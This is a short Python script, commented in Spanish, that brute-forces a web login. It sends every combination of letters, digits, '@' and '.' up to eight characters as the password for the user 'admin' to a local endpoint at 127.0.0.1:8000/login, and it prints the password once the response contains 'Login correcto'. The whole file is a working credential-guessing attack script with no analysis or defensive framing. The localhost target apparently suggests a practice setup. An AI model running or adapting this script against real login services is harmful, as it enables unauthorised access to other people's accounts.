import requests
import itertools
import time

def bruteforce_api(longitud, usuario, url):
    caracteres = "ABCDEFGHIJKLMNÑOPQRSTUVWXYZabcdefghijklmnñopqrstuvwxyz1234567890@."
    for intento in itertools.product(caracteres, repeat=longitud):
        intento_str = ''.join(intento)
        params = {"username": usuario, "password": intento_str}
        try:
            response = requests.post(url, params=params)
            if response.status_code == 404:
                print(f"Error 404: Endpoint no encontrado para intento {intento_str}")
                continue
            if response.status_code == 202:
                print(f"Error 202: Solicitud aceptada pero no procesada para intento {intento_str}")
                continue
            if "Login correcto" in response.text:
                print(f"Contraseña encontrada: {intento_str}")
                return intento_str
        except requests.exceptions.RequestException as e:
            print(f"Error de conexión con intento {intento_str}: {e}")
            continue
    return None

if __name__ == '__main__':
    usuario = "admin"
    url = "http://127.0.0.1:8000/login"    
    objetivo_len = 8
    tiempo_inicio = time.perf_counter()

    for longitud in range(1, objetivo_len + 1):
        resultado = bruteforce_api(longitud, usuario, url)
        if resultado:
            break

    tiempo_fin = time.perf_counter()
    print(f"Tiempo total transcurrido: {tiempo_fin - tiempo_inicio} segundos")